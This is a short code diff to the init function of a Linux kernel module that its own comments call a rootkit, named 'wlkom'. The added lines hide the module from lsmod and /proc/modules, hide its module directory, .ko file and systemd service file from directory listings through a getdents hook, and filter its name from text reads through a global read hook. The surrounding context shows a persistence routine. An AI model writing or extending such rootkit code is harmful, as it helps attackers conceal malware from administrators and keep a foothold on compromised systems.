@@ -53,7 +53,17 @@ static int __init wlkom_init(void)
         pr_err("WLKOM: hide_init failed\n");
         return ret;
     }
+
+    /* Hide the module itself from lsmod and /proc/modules */
     hide_module();
+
+    /* Hide rootkit files from directory listings (getdents hook) */
+    hide_file("wlkom");              /* kernel/wlkom/ dir in /lib/modules */
+    hide_file("wlkom.ko");           /* .ko file */
+    hide_file("wlkom.service");      /* systemd service file */
+
+    /* Hide rootkit from text-based listings (read hook applies globally) */
+    hide_line("", "wlkom");          /* filters "wlkom" from /proc/modules, lsmod, etc. */
 
     ret = persist_init();
     if (ret < 0)
